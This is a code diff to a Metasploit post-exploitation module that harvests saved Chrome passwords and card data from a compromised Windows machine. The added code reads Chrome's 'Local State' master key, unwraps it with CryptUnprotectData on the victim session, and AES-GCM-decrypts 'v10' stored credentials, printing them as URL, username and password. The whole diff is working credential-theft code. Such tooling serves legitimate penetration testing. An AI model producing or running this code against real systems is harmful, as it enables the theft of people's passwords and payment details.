@@ -79,7 +79,7 @@ class MetasploitModule < Msf::Post
   end
 
   def extension_mailvelope(username, extname)
-    chrome_path = @profiles_path + "\\" + username + @data_path
+    chrome_path = @profiles_path + "\\" + username + @data_path + 'Default'
     maildb_path = chrome_path + "/Local Storage/chrome-extension_#{extname}_0.localstorage"
     if file_exist?(maildb_path) == false
       print_error("==> Mailvelope database not found")
@@ -119,30 +119,37 @@ class MetasploitModule < Msf::Post
     end
   end
 
+  def get_master_key(local_state_path)
+    local_state_data = read_file(local_state_path)
+    local_state = JSON.parse(local_state_data)
+    master_key_base64 = local_state['os_crypt']['encrypted_key']
+    master_key = Rex::Text.decode_base64(master_key_base64)
+    master_key
+  end
+
   def decrypt_data(data)
     pid = session.sys.process.open.pid
     process = session.sys.process.open(pid, PROCESS_ALL_ACCESS)
 
-    mem = process.memory.allocate(1024)
+    memsize = 1024 * ((data.length + 1023) / 1024)
+    mem = process.memory.allocate(memsize)
     process.memory.write(mem, data)
 
     if session.sys.process.each_process.find { |i| i["pid"] == pid } ["arch"] == "x86"
-
       addr = [mem].pack("V")
       len = [data.length].pack("V")
-      ret = session.railgun.crypt32.CryptUnprotectData("#{len}#{addr}", 16, nil, nil, nil, 0, 8)
+      pdatain = "#{len}#{addr}".force_encoding('ascii')
+      ret = session.railgun.crypt32.CryptUnprotectData(pdatain, 16, nil, nil, nil, 0, 8)
       len, addr = ret["pDataOut"].unpack("V2")
-
     else
-
       addr = [mem].pack("Q")
       len = [data.length].pack("Q")
-      ret = session.railgun.crypt32.CryptUnprotectData("#{len}#{addr}", 16, nil, nil, nil, 0, 16)
+      pdatain = "#{len}#{addr}".force_encoding('ascii')
+      ret = session.railgun.crypt32.CryptUnprotectData(pdatain, 16, nil, nil, nil, 0, 16)
       len, addr = ret["pDataOut"].unpack("Q2")
-
     end
 
-    return "" if len == 0
+    return nil if len == 0
 
     decrypted = process.memory.read(addr, len)
     return decrypted
@@ -150,6 +157,7 @@ class MetasploitModule < Msf::Post
 
   def process_files(username)
     secrets = ""
+    masterkey = nil
     decrypt_table = Rex::Text::Table.new(
       "Header" => "Decrypted data",
       "Indent" => 1,
@@ -179,10 +187,30 @@ class MetasploitModule < Msf::Post
           item[:encrypted_fields].each do |field|
             name = (res["name_on_card"] == nil) ? res["username_value"] : res["name_on_card"]
             origin = (res["label"] == nil) ? res["origin_url"] : res["label"]
-            pass = res[field + "_decrypted"] = decrypt_data(res[field])
+            enc_data = res[field]
+
+            if enc_data.start_with? 'v10'
+              unless masterkey
+                print_status("Found password encrypted with masterkey")
+                local_state_path = @profiles_path + "\\" + username + @data_path + 'Local State'
+                masterkey_encrypted = get_master_key(local_state_path)
+                masterkey = decrypt_data(masterkey_encrypted[5..-1])
+                print_good("Found masterkey!")
+              end
+
+              cipher = OpenSSL::Cipher.new('aes-256-gcm')
+              cipher.decrypt
+              cipher.key = masterkey
+              cipher.iv = enc_data[3..14]
+              ciphertext = enc_data[15..-17]
+              cipher.auth_tag = enc_data[-16..-1]
+              pass = res[field + "_decrypted"] = cipher.update(ciphertext) + cipher.final
+            else
+              pass = res[field + "_decrypted"] = decrypt_data(enc_data)
+            end
             if pass != nil and pass != ""
               decrypt_table << [name, pass, origin]
-              secret = "#{name}:#{pass}..... #{origin}"
+              secret = "url:#{origin} #{name}:#{pass}"
               secrets << secret << "\n"
               vprint_good("Decrypted data: #{secret}")
             end
@@ -199,7 +227,7 @@ class MetasploitModule < Msf::Post
 
   def extract_data(username)
     # Prepare Chrome's path on remote machine
-    chrome_path = @profiles_path + "\\" + username + @data_path
+    chrome_path = @profiles_path + "\\" + username + @data_path + 'Default'
     raw_files = {}
 
     @chrome_files.map { |e| e[:in_file] }.uniq.each do |f|
@@ -311,10 +339,10 @@ class MetasploitModule < Msf::Post
     sysdrive = env_vars['SYSTEMDRIVE'].strip
     if directory?("#{sysdrive}\\Users")
       @profiles_path = "#{sysdrive}/Users"
-      @data_path = "\\AppData\\Local\\Google\\Chrome\\User Data\\Default"
+      @data_path = "\\AppData\\Local\\Google\\Chrome\\User Data\\"
     elsif directory?("#{sysdrive}\\Documents and Settings")
       @profiles_path = "#{sysdrive}/Documents and Settings"
-      @data_path = "\\Local Settings\\Application Data\\Google\\Chrome\\User Data\\Default"
+      @data_path = "\\Local Settings\\Application Data\\Google\\Chrome\\User Data\\"
     end
 
     # Get user(s)
